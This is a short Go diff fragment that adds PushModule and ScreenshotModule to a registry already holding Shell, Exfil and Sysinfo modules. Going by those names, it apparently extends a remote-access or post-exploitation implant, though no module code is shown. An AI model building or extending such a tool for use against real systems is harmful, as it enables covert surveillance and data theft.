@@ -4,4 +4,6 @@ func init() {
 	RegisterModule(&ShellModule{})
 	RegisterModule(&ExfilModule{})
 	RegisterModule(&SysinfoModule{})
+	RegisterModule(&PushModule{})
+	RegisterModule(&ScreenshotModule{})
 }
